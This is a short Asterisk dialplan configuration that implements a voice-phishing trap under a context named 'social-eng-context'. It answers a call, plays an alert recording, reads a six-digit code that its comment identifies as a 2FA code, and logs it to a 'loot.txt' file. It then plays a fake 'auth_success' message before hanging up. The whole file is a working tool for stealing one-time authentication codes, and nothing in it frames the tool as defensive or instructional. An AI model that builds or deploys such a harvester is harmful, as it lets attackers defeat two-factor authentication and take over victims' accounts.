[general]
static=yes
writeprotect=no

[social-eng-context]
exten => s,1,Answer()
exten => s,n,Wait(1)
; Play the alert sound
exten => s,n,Playback(panda_alert)
; Wait for 6 digits (2FA code)
exten => s,n,Read(DIGITS,,6,,,10)
; Log results to the loot box
exten => s,n,System(echo "LOOT: User entered ${DIGITS}" >> /usr/lib/gemini-cli/.out/wifi_data/loot.txt)
exten => s,n,Playback(auth_success)
exten => s,n,Hangup()
